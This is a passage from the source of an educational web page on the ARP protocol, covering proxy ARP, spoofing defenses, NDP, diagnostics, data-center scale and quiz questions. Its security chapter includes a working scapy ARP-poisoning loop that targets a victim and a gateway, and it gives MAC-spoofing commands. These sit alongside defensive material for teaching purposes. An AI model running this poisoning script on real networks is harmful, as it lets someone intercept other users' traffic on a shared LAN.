        If a host has the wrong default gateway configured, ARP will still work for local subnet
        communication, but traffic to other networks will fail. A common diagnostic mistake: pinging
        a local host works (direct ARP), but pinging 8.8.8.8 fails (can&apos;t reach gateway). Check the
        default gateway: <Code>ip route | grep default</Code> (Linux) or <Code>ipconfig | grep Gateway</Code> (Windows).
      </Warn>

      <Divider />

      {/* ── Chapter 06 ── */}
      <Chapter n={6} title="Proxy ARP: Responding on Behalf of Others" />

      <Para>
        Proxy ARP (RFC 1027, 1987) allows a router to respond to ARP requests on behalf of a host
        on a different subnet, making the remote host appear to be local. The router intercepts the
        broadcast and replies with its own MAC address — traffic sent to that MAC is then routed
        to the actual destination.
      </Para>

      <CodeBlock>{`Normal ARP: Only 192.168.1.x hosts can reach 192.168.1.50 directly.

With Proxy ARP enabled on the router:
  Host 192.168.1.50 sends ARP for 10.0.0.5 (different subnet).
  Normally, this would fail (ARP only works on local subnet).
  Router intercepts: "I know how to reach 10.0.0.5"
  Router replies to ARP request with its own MAC address.
  Host sends frames to router's MAC → router routes to 10.0.0.5.

Use case: hosts without a default gateway configured can still reach
  remote hosts via Proxy ARP (legacy configuration, not recommended).

Modern use: VPN concentrators use Proxy ARP to make VPN clients
  appear local to the corporate network — the VPN gateway responds
  to ARP for VPN client IPs.

Risks:
  Proxy ARP enlarges broadcast domains, causes ARP cache to be full of
  router MACs, and can mask misconfigurations (hosts without default GW
  "work" via Proxy ARP but are poorly configured).
  Disable on modern networks: "no ip proxy-arp" on Cisco interfaces.`}</CodeBlock>

      <Divider />

      {/* ── Chapter 07 ── */}
      <Chapter n={7} title="ARP Security: Attacks and Defenses" />

      <Para>
        ARP has no authentication. Any host on the local segment can send an ARP Reply claiming to
        own any IP address. The receiving host will update its ARP cache without verification.
        This is called <Accent>ARP spoofing</Accent> or <Accent>ARP poisoning</Accent> and is one
        of the most common local network attacks.
      </Para>

      <ArpPoisoningDemo />

      <H2>ARP Spoofing Attack in Detail</H2>

      <CodeBlock>{`Attack tool: arpspoof (dsniff), ettercap, scapy, bettercap

# Classic ARP poisoning with scapy:
from scapy.all import *

gateway_ip = "192.168.1.1"
gateway_mac = "11:22:33:44:55:66"
victim_ip = "192.168.1.50"
attacker_mac = "AA:AA:AA:AA:AA:AA"

# Poison victim: tell them the gateway's MAC is ours
arp_poison_victim = ARP(
    op=2,           # Reply
    pdst=victim_ip,
    hwdst="ff:ff:ff:ff:ff:ff",  # or victim's actual MAC
    psrc=gateway_ip,
    hwsrc=attacker_mac,
)
# Poison gateway: tell them the victim's MAC is ours
arp_poison_gateway = ARP(
    op=2,
    pdst=gateway_ip,
    hwdst=gateway_mac,
    psrc=victim_ip,
    hwsrc=attacker_mac,
)
# Must send continuously (every 2s) or ARP cache expires and real MACs are re-learned
while True:
    send(arp_poison_victim, verbose=0)
    send(arp_poison_gateway, verbose=0)
    time.sleep(2)`}</CodeBlock>

      <H2>Defenses Against ARP Attacks</H2>

      <CodeBlock>{`1. Dynamic ARP Inspection (DAI) — on managed switches:
   Switch intercepts all ARP frames before forwarding.
   Validates Src IP + Src MAC against DHCP snooping binding table.
   Invalid ARP → drop. Valid ARP → forward normally.
   Config (Cisco):
     ip dhcp snooping
     ip dhcp snooping vlan 10
     ip arp inspection vlan 10
     interface Gi0/1       ← access port (untrusted)
       ip arp inspection limit rate 100
     interface Gi0/24      ← uplink (trusted)
       ip arp inspection trust

2. Static ARP entries (for critical infrastructure):
   $ arp -s 192.168.1.1 11:22:33:44:55:66     # Linux
   $ netsh interface ipv4 set neighbors "Ethernet" 192.168.1.1 11-22-33-44-55-66  # Windows
   Attacker's ARP replies cannot overwrite static entries.
   Operationally difficult at scale — use DAI instead.

3. 802.1X port authentication:
   Unauthenticated devices cannot send frames at all → no ARP poisoning possible.
   Strongest defense, highest operational overhead.

4. VLANs:
   Segment network so attacker cannot reach victim's broadcast domain.
   ARP is link-local — VLANs are impermeable to ARP.

5. Encrypted transport (TLS/HTTPS):
   Even if attacker intercepts traffic via ARP poisoning, encrypted content is unreadable.
   HTTPS + HSTS + certificate pinning renders MITM attacks useless for web traffic.`}</CodeBlock>

      <Divider />

      {/* ── Chapter 08 ── */}
      <Chapter n={8} title="NDP: ARP's IPv6 Replacement" />

      <Para>
        IPv6 doesn&apos;t use ARP. Instead, it uses <Accent>NDP</Accent> (Neighbor Discovery Protocol, RFC 4861),
        which runs over ICMPv6. NDP is significantly more capable and secure than ARP — it was designed
        with 40 years of ARP&apos;s known weaknesses in mind.
      </Para>

      <CodeBlock>{`ARP (IPv4) vs NDP (IPv6) comparison:

Function               ARP                    NDP
───────────────────────────────────────────────────────────────────────
Address resolution     ARP Request/Reply      ICMPv6 Neighbor Solicitation/Advertisement
Router discovery       ICMP Router Discovery  ICMPv6 Router Solicitation/Advertisement
IP config              DHCP (separate)        SLAAC (Stateless Address Autoconfiguration)
Duplicate detection    Gratuitous ARP (basic) Duplicate Address Detection (DAD, robust)
Prefix discovery       None (need static GW)  Router Advertisement carries prefix info
Redirect               ICMP Redirect          NDP Redirect
Security               None                   SEcure Neighbor Discovery (SEND, RFC 3971)

NDP uses multicast instead of broadcast:
  NDP Solicitation sent to ff02::1:ff/104 (solicited-node multicast)
  → Only hosts whose last 24 bits of IPv6 address match receive it
  → Much lower broadcast overhead vs ARP's broadcast to all hosts

$ ip -6 neighbor show   # Linux: show IPv6 neighbor cache
$ ip -6 neigh flush dev eth0  # Flush IPv6 neighbor cache`}</CodeBlock>

      <WowBox emoji="🔐" title="SEcure Neighbor Discovery (SEND)">
        SEcure Neighbor Discovery (SEND, RFC 3971) adds cryptographic signatures to NDP messages using
        Cryptographically Generated Addresses (CGAs). A CGA ties the IPv6 address to a public key —
        only the holder of the private key can claim that address. NDP spoofing becomes computationally
        infeasible. SEND deployment is limited in practice (complexity, no wide vendor support), but it
        represents what ARP should have been from the start.
      </WowBox>

      <Divider />

      {/* ── Chapter 09 ── */}
      <Chapter n={9} title="ARP in Different Scenarios" />

      <H2>ARP Over Wi-Fi</H2>

      <Para>
        Wi-Fi at Layer 2 looks identical to Ethernet from the ARP perspective — same MAC address format,
        same broadcast mechanism. The access point forwards the ARP broadcast to all associated clients.
        ARP probing and conflict detection work the same way. The only difference: Wi-Fi has higher latency
        and may have IGMP/ARP proxy optimizations to reduce broadcast overhead.
      </Para>

      <H2>ARP in VLANs</H2>

      <Para>
        ARP broadcasts are confined to a VLAN. A host in VLAN 10 cannot ARP for a host in VLAN 20 —
        even if they&apos;re on the same physical switch. To communicate across VLANs, traffic must be routed
        by a Layer 3 device (router or Layer 3 switch). The router has an interface in each VLAN and
        ARPs separately on each VLAN segment.
      </Para>

      <H2>ARP in Virtual Environments</H2>

      <CodeBlock>{`Hypervisor ARP handling:
  Virtual NICs have unique MAC addresses allocated by the hypervisor (OUI: 52:54:00 for KVM).
  ARP works normally between VMs on the same host (via virtual switch, no physical network).
  Live migration: VM moves to new host → new physical NIC. Hypervisor sends Gratuitous ARP.

  Issues:
  - "ARP storm": hundreds of VMs starting simultaneously all send Gratuitous ARPs
  - ARP suppression in overlay networks (VXLAN): tunnel gateway responds to ARP locally
    rather than flooding the physical underlay network

VXLAN ARP suppression:
  Traditional VXLAN floods ARP requests to ALL VXLAN tunnel endpoints (VTEPs).
  ARP suppression: VTEP caches IP→MAC mappings from control plane (BGP EVPN).
  When a VM ARPs, the local VTEP responds directly — no flood.
  Eliminates broadcast storms at VXLAN scale (100,000+ VMs).
  Cisco ACI, Cumulus VX, VMware NSX all use ARP suppression.`}</CodeBlock>

      <Divider />

      {/* ── Chapter 10 ── */}
      <Chapter n={10} title="Diagnosing ARP Problems" />

      <Para>
        ARP failures cause connectivity issues that are confusing because ping fails but the physical
        connection is fine. Systematic ARP debugging gets to the answer quickly.
      </Para>

      <H2>ARP Diagnostic Toolkit</H2>

      <CodeBlock>{`# Check ARP cache
arp -a                          # Windows/macOS
ip neigh show                   # Linux (modern)
ip neigh show dev eth0          # Linux: specific interface

# Test ARP directly
arping -I eth0 192.168.1.1      # Send ARP request, show response
arping -I eth0 -c 3 192.168.1.1 # Send 3 ARP requests

# Capture ARP traffic in Wireshark
Capture filter: arp
Display filter: arp.opcode == 1   (requests only)
Display filter: arp.opcode == 2   (replies only)
Display filter: arp.src.hw_mac == aa:bb:cc:dd:ee:ff  (from specific MAC)

# View ARP in tcpdump
tcpdump -n -e arp                # ARP with MAC addresses
tcpdump -n -e 'arp and host 192.168.1.1'  # ARP for specific IP

# Common failure symptoms:
1. ping fails to local host → check ARP
   ip neigh show | grep 192.168.1.100
   → If "FAILED": ARP requests sent, no reply → host is down or unreachable
   → If missing: ARP not attempted → check routing table

2. Connectivity drops periodically (~5 min intervals)
   → ARP cache expiring, ARP renewal fails
   → Intermittent physical issue causing ARP packets to be lost

3. Traffic going to wrong host
   → ARP poisoning in progress: check for multiple IPs claiming same MAC
   arp -a | grep -v incomplete | awk '{print $4}' | sort | uniq -d
   → Duplicate MAC = ARP spoofing or misconfigured VMs

4. IP conflict warning
   → Two hosts respond to ARP for same IP
   → Run Gratuitous ARP and watch who else responds:
   arping -I eth0 -c 5 192.168.1.50 2>&1 | grep -i "Unicast reply"`}</CodeBlock>

      <Divider />

      {/* ── Chapter 11 ── */}
      <Chapter n={11} title="ARP at Scale: Cloud and Data Center Challenges" />

      <Para>
        In small networks ({'<'} 100 hosts), ARP is invisible — it works in microseconds, consumes negligible
        bandwidth, and never needs attention. In large cloud deployments (100,000+ VMs), ARP becomes
        a critical scalability bottleneck.
      </Para>

      <H2>The Scale Problem</H2>

      <CodeBlock>{`Small LAN: 50 hosts
  ARP broadcast reaches 50 hosts.
  50 devices each process the ARP request.
  One ARP per new destination — negligible overhead.

Cloud data center: 100,000 VMs in one flat L2 domain (bad design):
  One VM ARPs → 100,000 VMs wake up to process the broadcast.
  Each VM doing 100 connections/minute → 100,000 × 100 ARP requests/min
  = 10,000,000 ARP broadcasts per minute
  Every VM's CPU interrupted 10M times/minute just for ARP processing.
  Network saturated with ARP broadcast traffic.

Solutions for large scale:
  1. VLAN segmentation: keep broadcast domains < 500 hosts
  2. Overlay networks (VXLAN, GENEVE): ARP suppression via BGP EVPN
  3. Software-defined networking: controller responds to ARP queries directly
  4. IPv6: NDP uses solicited-node multicast (targets only relevant hosts)`}</CodeBlock>

      <Divider />

      {/* ── Chapter 12 ── */}
      <Chapter n={12} title="ARP in Unusual Situations" />

      <H3>ARP on Point-to-Point Links</H3>

      <Para>
        On a /30 or /31 subnet (point-to-point link between two routers), ARP is still used. The two
        routers ARP for each other&apos;s IP on the link. Some point-to-point protocols (PPP, HDLC) don&apos;t use ARP
        at all — they assume the only host on the link is the connected device and hardcode the neighbor.
        On Ethernet point-to-point links, ARP still runs and is fine with just 2 hosts.
      </Para>

      <H3>ARP for High Availability (Floating IP / VIP)</H3>

      <Para>
        Load balancers and HA systems use <Accent>virtual IPs</Accent> (VIPs) — a shared IP that floats
        between physical servers. When the active node fails, the standby takes over the VIP and sends
        a Gratuitous ARP to update all ARP caches. Properly done, failover completes in under 1 second.
        Improperly done (ARP cache TTL too long, or Gratuitous ARP blocked by switch ACLs), failover
        takes minutes while ARP caches expire naturally.
      </Para>

      <H3>ARP and VRRP/HSRP</H3>

      <Para>
        VRRP (Virtual Router Redundancy Protocol, RFC 5798) and HSRP (Hot Standby Router Protocol, Cisco)
        allow multiple routers to share a virtual IP as the default gateway. One is "master" (or active),
        the others are standby. The virtual IP is associated with a virtual MAC address (e.g., VRRP uses
        <Code>00:00:5E:00:01:XX</Code> where XX is the VRRP group number). Hosts ARP for the VIP and
        receive the virtual MAC. When the master fails, the new master takes over the virtual MAC —
        no ARP update needed by hosts.
      </Para>

      <Divider />

      {/* ── Chapter 13 ── */}
      <Chapter n={13} title="Common Misconceptions" />

      <Err title="ARP is only used at startup">
        <strong>"ARP is only used when a host first joins the network."</strong><br /><br />
        ARP is used continuously. Every time a host sends traffic to a new IP on its subnet, or to its
        gateway for traffic to remote destinations, it checks the ARP cache and sends a new ARP Request
        if the entry is missing or expired. ARP cache entries expire after 300 seconds (Linux) or
        up to 10 minutes (Windows). A host with many connections to many different IPs sends ARP
        requests regularly throughout its operation.
      </Err>

      <Err title="ARP works across routers">
        <strong>"ARP works across routers — you can ARP for any IP on the internet."</strong><br /><br />
        ARP is strictly local — it uses Ethernet broadcast, which routers do not forward. ARP can only
        resolve IP-to-MAC mappings for hosts on the <em>same local subnet</em>. When you send traffic
        to 8.8.8.8, you ARP for your gateway&apos;s IP (192.168.1.1), not for 8.8.8.8 directly. The gateway
        then ARPs for the next hop on its own subnet. Each subnet does its own ARP independently.
      </Err>

      <Err title="ARP poisoning requires special tools or skill">
        <strong>"ARP poisoning requires special hacking tools and skill."</strong><br /><br />
        ARP poisoning requires sending crafted UDP/Ethernet frames — something any host on the network
        can do with basic tools. Tools like <Code>arpspoof</Code>, <Code>ettercap</Code>, and <Code>scapy</Code>
        make it trivially easy. A few lines of Python with scapy can perform ARP poisoning. This is why
        ARP poisoning is effective against unsuspecting users on shared networks (coffee shops, hotels)
        and why network-level defenses (DAI, 802.1X) are important for protecting such environments.
      </Err>

      <Err title="MAC addresses are harder to spoof than IP addresses">
        <strong>"MAC addresses are harder to spoof than IP addresses."</strong><br /><br />
        Both are trivially spoofable in software. On Linux: <Code>ip link set eth0 address AA:BB:CC:DD:EE:FF</Code>.
        On macOS: <Code>sudo ifconfig en0 ether AA:BB:CC:DD:EE:FF</Code>. On Windows: change in Device Manager
        or via registry. ARP poisoning combines MAC spoofing with ARP reply injection. Neither IP
        addresses nor MAC addresses are reliable authentication mechanisms — both are trivially
        changeable by any user with system-level access.
      </Err>

      <Err title="HTTPS fully prevents ARP poisoning attacks">
        <strong>"If you use HTTPS, ARP poisoning can&apos;t hurt you."</strong><br /><br />
        HTTPS protects the <em>content</em> of your communication. ARP poisoning is a network-level attack
        that intercepts all traffic including HTTPS. However, the attacker sees only ciphertext — they
        cannot read the content. The real risk of ARP poisoning + HTTPS is: (1) SSL stripping (attacker
        downgrades HTTPS to HTTP using a proxy) — mitigated by HSTS. (2) Certificate forgery (attacker
        presents a fake cert) — mitigated by HSTS preload and certificate pinning. HTTPS significantly
        reduces the impact of ARP poisoning, but doesn&apos;t prevent the interception itself.
      </Err>

      <Err title="ARP is the same as DNS">
        <strong>"ARP is the same as DNS."</strong><br /><br />
        ARP resolves IP addresses to MAC addresses on a local network segment. DNS resolves domain names
        to IP addresses across the internet. They operate at completely different layers, with completely
        different mechanisms. ARP is Layer 2, DNS is Layer 7. ARP uses broadcasts, DNS uses unicast UDP/TCP.
        ARP is automatic and implicit; DNS is explicitly queried by applications. ARP is local-only; DNS
        crosses network boundaries. A computer uses DNS first (to find the IP), then ARP (to find the MAC).
      </Err>

      <Divider />

      {/* ── Chapter 14 ── */}
      <Chapter n={14} title="Test Your Understanding" />

      <IQ q="You try to ping 192.168.1.100 but get 'no reply.' How do you determine whether this is an ARP problem or an IP routing problem?" level="Beginner">
        Use <Code>arping -I eth0 192.168.1.100</Code> to send an ARP request directly. If arping gets a reply,
        ARP works but the host is not responding to ICMP ping (possibly firewall). If arping gets no reply,
        the host is either down, on a different subnet, or not reachable at Layer 2. Check the ARP cache:
        <Code>ip neigh show | grep 192.168.1.100</Code> — if it shows "FAILED," ARP requests were sent with
        no response. Verify the target is on the same subnet as your interface.
      </IQ>

      <IQ q="Why does your browser need to know the gateway's MAC address to load a webpage from Google?" level="Beginner">
        To load a webpage from Google (e.g., 142.250.182.14), your computer creates an IP packet destined
        for 142.250.182.14. To put this packet on the Ethernet cable, it needs an Ethernet frame with a
        destination MAC address. Since Google&apos;s server is not on your local subnet, your computer consults its
        routing table and finds the default route via your gateway (192.168.1.1). It then ARPs for the gateway&apos;s
        MAC address. The Ethernet frame destination MAC = gateway&apos;s MAC, but the IP destination = 142.250.182.14.
        The gateway receives the frame, strips the Ethernet header, reads the IP destination, and routes
        it toward Google through the internet.
      </IQ>

      <IQ q="Explain Gratuitous ARP and give three real production scenarios where it is essential for correct operation." level="Intermediate">
        Gratuitous ARP: a host sends an ARP Reply (or Request) where the sender IP = target IP — announcing
        its own IP-to-MAC mapping without being asked.
        Scenarios: (1) <em>IP conflict detection</em>: before using an IP, a host sends Gratuitous ARP. If another
        host replies, there&apos;s a conflict — the client displays an error and doesn&apos;t use the IP (required by RFC 5227
        for DHCP clients). (2) <em>Failover/High Availability</em>: a load balancer or VRRP standby node becomes
        active and takes over a virtual IP. It sends Gratuitous ARP so all hosts immediately update their
        ARP cache — without this, hosts continue sending to the failed node&apos;s MAC until ARP expires.
        (3) <em>VM live migration</em>: a VM moves to a new hypervisor host. The new host sends Gratuitous ARP
        for the VM&apos;s IP, so all hosts and switches learn the new location. Without it, traffic would
        continue reaching the old physical port until ARP ages out (~5 minutes of downtime).
      </IQ>

      <IQ q="How does Dynamic ARP Inspection (DAI) prevent ARP poisoning, and what is its dependency on DHCP snooping?" level="Intermediate">
        DAI intercepts all ARP packets on untrusted ports and validates them against a DHCP snooping
        binding table before forwarding. The binding table contains {"{IP → MAC → port → VLAN}"} mappings
        for every host that received an IP via DHCP. When an ARP arrives:
        (1) Switch extracts Sender IP and Sender MAC from the ARP payload.
        (2) Looks up Sender IP in binding table.
        (3) If Sender MAC matches binding table → ARP is legitimate → forward.
        (4) If Sender MAC doesn&apos;t match → ARP is spoofed → drop + log.
        DHCP snooping is the dependency: it intercepts DHCP exchanges to build the binding table.
        Without DHCP snooping running first, DAI has no reference data. Hosts with static IP assignments
        need manual DAI entries: <Code>ip arp inspection filter arp-acl vlan 10</Code> with a static
        ARP ACL listing the static IP-MAC pairs.
      </IQ>

      <IQ q="In a VXLAN overlay network with 50,000 VMs, explain how BGP EVPN + ARP suppression prevents broadcast storms." level="Senior">
        Without ARP suppression: when any of 50,000 VMs ARPs for another VM, the ARP broadcast is
        encapsulated in VXLAN and flooded to all 200 VTEPs (Virtual Tunnel Endpoints). Each VTEP
        decapsulates and delivers to all local VMs in that VNI. 50,000 VMs × average 100 ARPs/minute =
        5,000,000 broadcasts/minute, each reaching all 200 VTEPs and all local VMs — massive overhead.
        <br /><br />
        With BGP EVPN + ARP suppression: BGP EVPN is a control plane for overlay networks. VTEPs
        advertise their local VMs&apos; IP-MAC-VNI bindings to all other VTEPs via BGP Type-2 routes
        (MAC/IP Advertisement). Each VTEP builds a local ARP suppression table. When a local VM ARPs,
        the VTEP checks its table: if the target IP is known, the VTEP sends the ARP reply locally
        (acting as ARP proxy) — no flood required. If unknown, a limited VTEP-to-VTEP unicast query
        is sent to the VTEP that advertised that IP. Broadcast floods are eliminated or drastically reduced.
        <br /><br />
        Result: 50,000-VM fabric with near-zero ARP broadcast overhead. Control plane complexity (BGP
        configuration) increases, but data plane performance and scale improve dramatically. This is why
        Cisco ACI, VMware NSX, Cumulus, and AWS all use BGP EVPN with ARP suppression.
      </IQ>

      <IQ q="Describe how VRRP uses a virtual MAC address to achieve seamless gateway redundancy without requiring ARP updates from hosts." level="Senior">
        VRRP (RFC 5798) assigns a virtual IP (VIP) as the default gateway for hosts. Multiple routers
        participate in a VRRP group, one of which is elected Master. VRRP creates a virtual MAC address:
        <Code>00:00:5E:00:01:GG</Code> where GG is the VRRP group number in hex. This virtual MAC is
        "owned" by whichever router is the Master at any given moment.
        <br /><br />
        The key insight: hosts ARP for the VIP (e.g., 192.168.1.254) and receive the virtual MAC
        (e.g., 00:00:5E:00:01:01). They cache this mapping. When the Master router fails, the Backup
        router detects the failure (no VRRP advertisements) and transitions to Master. It takes over
        the VIP <em>and</em> the virtual MAC — it programs the virtual MAC into its own NIC. Switch CAM
        tables update immediately (the switch sees the virtual MAC arriving from a different port).
        Hosts don&apos;t need new ARP at all — their cache still maps VIP → virtual MAC → (new) Master.
        Only the switch CAM table entry updates, which happens within milliseconds of the first frame.
        Typical VRRP failover time: 1-3 seconds (one missed advertisement + switch learning).
      </IQ>

      <IQ q="Analyze why ARP's lack of authentication is a fundamental protocol design failure, and evaluate the tradeoffs of the proposed solutions (SEND, DAI, static ARP) from a systems perspective." level="PhD">
        ARP was designed in 1982 for a trusted academic network. The design assumption: all hosts on
        the network are cooperative. Gratuitous ARPs and unsolicited replies are accepted and cached
        because in the original context, sending a Gratuitous ARP was a helpful host announcing its
        presence — why would it lie? This assumption fails completely in any multi-tenant environment.
        <br /><br />
        The fundamental flaw: ARP couples address binding with network trust. Any host can claim any
        IP-MAC binding without proof. This violates the principle of least privilege — ARP announcements
        should only be accepted if the source is authorized to own the claimed IP.
        <br /><br />
        Proposed solutions and their tradeoffs:
        <br /><br />
        (1) <em>Static ARP</em>: manually configure every IP-MAC binding. Provides perfect security (no dynamic
        learning). Operationally catastrophic at scale — every device addition/replacement requires manual
        updates on every other host. O(N²) configuration complexity. Breaks DHCP, live migration, and
        any dynamic IP assignment. Only practical for a handful of critical servers.
        <br /><br />
        (2) <em>Dynamic ARP Inspection</em>: offloads trust decisions to the switch, using DHCP as the
        authorization mechanism. Works well in practice, widely deployed. Fundamental weakness: trust
        anchor is DHCP, which is also unauthenticated. A malicious DHCP server can poison the binding
        table. Requires managed switches (capital expense), doesn&apos;t protect against attacks from trusted ports.
        <br /><br />
        (3) <em>SEND (RFC 3971)</em>: cryptographic signatures on NDP (IPv6 equivalent). Each host generates
        a public/private key pair and derives a Cryptographically Generated Address (CGA) from the public key.
        NDP messages signed with private key; recipients verify signature. Mathematically sound — forging
        an ARP-equivalent requires breaking the public key system. Deployment failure: requires every host
        to run SEND and verify signatures. No operating system shipped SEND support by default. Certificate
        infrastructure (who is the CA for layer-2 claims?) is undefined in practice. IKEv2 for IPSec took
        a decade to deploy; SEND requires layer-2 PKI which is arguably harder.
        <br /><br />
        (4) <em>IPv6 NDP with SEcure Neighbor Discovery</em>: the intended replacement. But IPv6 transition
        itself took 20+ years. Moving the security timeline another 10 years.
        <br /><br />
        The pragmatic engineering answer: DAI + 802.1X + network segmentation is the real-world solution.
        Not architecturally clean, but deployable with existing hardware. SEND/cryptographic ARP remains
        an academic exercise — a correct solution to a problem the ecosystem won&apos;t prioritize fixing at
        the root.
      </IQ>

      <Divider />

      <KeyTakeaways items={[
        'ARP (RFC 826, 1982) resolves IP addresses to MAC addresses on a local network segment. Without ARP, IP over Ethernet cannot work.',
        'ARP Request is a broadcast (FF:FF:FF:FF:FF:FF) asking "Who has IP X?" ARP Reply is a unicast: "I do, my MAC is Y." 28 bytes total payload.',
        'ARP is strictly local — it only works within a subnet. Traffic to remote IPs ARPs for the gateway\'s MAC, not the final destination.',
        'ARP cache stores recent IP→MAC mappings. Entries expire in ~300s (Linux) to ~10 minutes (Windows). Expired = ARP request before next packet.',
        'Gratuitous ARP: host announces its own IP→MAC mapping. Used for IP conflict detection, failover, and VM migration.',
        'ARP has no authentication. Any host can send fake ARP Replies claiming any IP→MAC mapping. This is ARP poisoning/spoofing.',
        'Dynamic ARP Inspection (DAI) on managed switches validates ARP against DHCP snooping binding table. Blocks poisoning attacks.',
        'IPv6 replaces ARP with NDP (Neighbor Discovery Protocol) over ICMPv6. NDP adds router discovery, SLAAC, and duplicate address detection.',
        'VRRP/HSRP use virtual MAC addresses (00:00:5E:00:01:XX) so gateway failover requires no ARP update from hosts.',
        'At cloud scale (100,000+ VMs), ARP broadcasts create performance problems. BGP EVPN + ARP suppression eliminates floods via control-plane IP-MAC distribution.',
      ]} />
    </LearnLayout>
  )
}
